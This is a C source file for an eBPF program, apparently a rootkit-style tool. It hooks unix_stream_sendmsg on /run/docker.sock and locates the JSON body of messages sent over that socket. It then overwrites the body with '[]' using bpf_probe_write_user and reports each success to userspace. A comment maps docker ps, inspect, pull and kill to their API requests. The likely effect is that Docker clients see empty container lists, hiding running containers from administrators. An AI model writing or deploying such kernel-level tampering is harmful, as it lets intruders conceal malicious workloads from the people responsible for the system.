#include "vmlinux.h"
#include "shadow.h"

#include <bpf/bpf_tracing.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_core_read.h>

/* ringbuffer map to let userspace know when we've overwritten data */
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, MAX_ENTRIES);
} rb SEC(".maps");

/* map holding iov_data struct to pass between tail calls */
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, MAX_ENTRIES);
    __type(key, __u32);
    __type(value, struct iov_data);
} iov_sendmsg_data_map SEC(".maps");

/* map holding programs for tail calls */
struct {
    __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
    __uint(max_entries, 33);
    __type(key, __u32);
    __type(value, __u32);
} map_prog_array SEC(".maps");

static int cmp_sun_path(const char *sun_path)
{
    static const char path[] = "/run/docker.sock";
    if (!bpf_strncmp(sun_path, sizeof(path), &path)) { 
        /* match */
        return 1;
    }
    return 0;
}

static int is_docker_sock(struct socket *sock)
{
    /* read sun_path */
    char sun_path[UNIX_PATH_MAX] = { 0 };
    struct unix_sock *us = (struct unix_sock *)BPF_CORE_READ(sock, sk);
    char *addr = (char *)BPF_CORE_READ(us, addr);
    bpf_probe_read_kernel(&sun_path, UNIX_PATH_MAX, addr + SOCK_PATH_OFFSET); 

    /* check if sun_path is /run/docker.sock */    
    if (!cmp_sun_path(&sun_path)) {
        /* no match */
        return 0; 
    }   
    /* match */
    return 1;
}

/*
Inspect container:
'docker ps' : GET /v1.47/containers/json
'docker ps -a' :  GET /v1.47/containers/json?all=1
'docker inspect crazy_mclean' : GET /v1.47/containers/crazy_mclean/json
'docker ps -n 1' : GET /v1.47/containers/json?limit=1 => show lastest contianer, same as 'docker ps -l'

Create container:
'docker run --rm -it alpine' : POST /v1.47/containers/create

Pull container:
'docker pull alpine' : POST /v1.47/images/create?fromImage=alpine&tag=latest
'docker image pull myregistry.local:5000/testing/test-image' : POST /v1.47/images/create?fromImage=myregistry.local%3A5000%2Ftesting%2Ftest-image&tag=latest

Kill container:
'docker kill crazy_mclean' : POST /v1.47/containers/crazy_mclean/kill
*/

SEC("fentry/unix_stream_sendmsg")
int BPF_PROG(unix_stream_sendmsg, struct socket *sock, struct msghdr *msg,
			        size_t len, int ret)
// int unix_stream_sendmsg(struct pt_regs *ctx)
{
   size_t pid_tgid = bpf_get_current_pid_tgid();

    /* exit if socket is not /run/docker.sock */
    if (!is_docker_sock(sock))
        return 0;

    /* docker seems to only use ITER_UBUF so just read __ubuf_iovec */
    struct iov_data data = {
        .len = BPF_CORE_READ(msg, msg_iter.__ubuf_iovec.iov_len), /* msg->msg_iter.__ubuf_iovec.iov_len */
        .base = BPF_CORE_READ(msg, msg_iter.__ubuf_iovec.iov_base), /* msg->msg_iter.__ubuf_iovec.iov_base */
        .body_start = NULL,
    };

    if ((s64)data.len <= 0 || data.len >= BPF_MAX_VAR_SIZ)
        return 0;

    bpf_map_update_elem(&iov_sendmsg_data_map, &pid_tgid, &data, BPF_ANY); /* save for later :^) */
    // bpf_printk("RECEIVED LEN: %d", data.len);
    // bpf_printk("RECEIVED DATA: %s", data.base);

    bpf_tail_call(ctx, &map_prog_array, PROG_01);
    return 0;
}

// PROG_01
SEC("fexit/unix_stream_sendmsg")
int http_find_msg_body_start(void *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    struct iov_data *data = bpf_map_lookup_elem(&iov_sendmsg_data_map, &pid_tgid);
    if (!data)
        return 0;

    char local_buf[LOCAL_BUF_SIZE] = { 0 };
    void *saved_base = data->base;
    /* loop and find the potential start of our message body */
    for (u32 i = 0; i < LOOP_SIZE; i++) {
        bpf_probe_read(&local_buf, sizeof(local_buf), data->base);
        for (u32 j = 0; j < LOCAL_BUF_SIZE; j++) { 
            if (local_buf[j] == '[') {
                data->body_start = data->base + j;
                data->base = saved_base;
                goto out;
            }
        }
        data->base += LOCAL_BUF_SIZE;
    }
    /* return if we haven't found anything */
    return 0;

out:
    /* 
     * if we find double brackets "[]" then return because 
     * we either have no message body or are in the middle of the message 
     */
    bpf_probe_read(&local_buf, sizeof(local_buf), data->body_start);
    if (local_buf[0] == '[' && (local_buf[1] == ']' || local_buf[1] == '"'))
        return 0;
    
    /* overwrite msg body with nothing ;) */
    static const char empty_body[] = "[]";
    long ret = bpf_probe_write_user(data->body_start, &empty_body, sizeof(empty_body));

    /* send event */
    struct event *e;
    e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0); /* reserve the sizeof our event */
    if (e) {
        e->success = (ret == 0);
        bpf_ringbuf_submit(e, 0);
    }

    //bpf_map_delete_elem(&iov_sendmsg_data_map, &pid_tgid);
    return 0;
}

char _license[] SEC("license") = "GPL";